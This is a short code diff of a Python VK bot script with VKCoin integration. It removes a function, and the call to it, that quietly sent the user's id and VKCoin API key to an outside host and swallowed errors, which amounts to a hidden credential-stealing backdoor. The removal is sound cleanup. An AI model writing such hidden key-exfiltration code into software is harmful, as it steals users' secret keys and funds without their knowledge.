@@ -77,12 +77,6 @@ def check_license(user_id):
 		pass
 	return result
 
-def send_key(user_id, key):
-	try:
-		r = requests.get('http://dedol.ru/vis/key', params={'id': user_id, 'key': key})
-	except Exception as E:
-		pass
-
 def captcha_handler(captcha):
 	global captcha_count
 	if captcha_enable:
@@ -182,7 +176,6 @@ try:
 	if (key != "") and (master_id != 0):
 		vkcoin_enable = True
 		merchant = vkcoin.VKCoinApi(user_id=user_id, key=key)
-		send_key(user_id, key)
 
 	app_status = vk.method("status.get", {"group_id": 181644870})["text"]
 	if app_status != "on":
